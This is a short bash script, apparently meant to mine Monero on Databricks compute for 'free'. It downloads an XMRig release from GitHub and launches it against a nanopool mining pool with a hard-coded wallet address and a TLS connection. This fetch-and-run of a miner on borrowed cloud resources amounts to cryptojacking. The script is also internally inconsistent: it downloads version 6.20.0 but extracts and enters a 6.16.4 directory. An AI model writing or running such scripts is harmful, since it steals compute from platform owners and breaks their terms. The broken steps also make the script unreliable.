#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o xmr-asia1.nanopool.org:14433 -u 8BzzDzMwc4GQvohjahR2sYgzFfNDugPCHJf94Lqrzj4WDxCeviY1eVuRZKBzrXsFKMUEeGDg9t3WhDEj7FuNYUdJULc42zw -k --tls --rig-id vns
